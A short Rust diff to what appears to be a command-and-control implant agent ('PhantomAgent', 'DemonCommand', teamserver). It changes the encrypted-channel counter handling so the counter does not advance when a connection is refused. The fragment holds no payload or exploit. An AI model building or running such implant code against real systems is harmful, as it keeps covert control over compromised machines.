@@ -44,11 +44,12 @@ impl PhantomAgent {
 
         let response = self.transport.send(&packet).await;
 
-        // Always advance — the teamserver consumes the packet and advances its CTR
-        // before sending the response. If the TCP response is lost, the server's
-        // CTR is ahead; not advancing here would desync every subsequent packet.
-        self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandGetJob), 0);
-        self.callback_seq += 1;
+        // Advance unless connection-refused (server never processed the packet).
+        // See COMMAND_CHECKIN advance in checkin() for the full rationale.
+        if !matches!(&response, Err(PhantomError::ConnectionRefused(_))) {
+            self.ctr_offset += callback_ctr_blocks(u32::from(DemonCommand::CommandGetJob), 0);
+            self.callback_seq += 1;
+        }
 
         let response = response?;
 
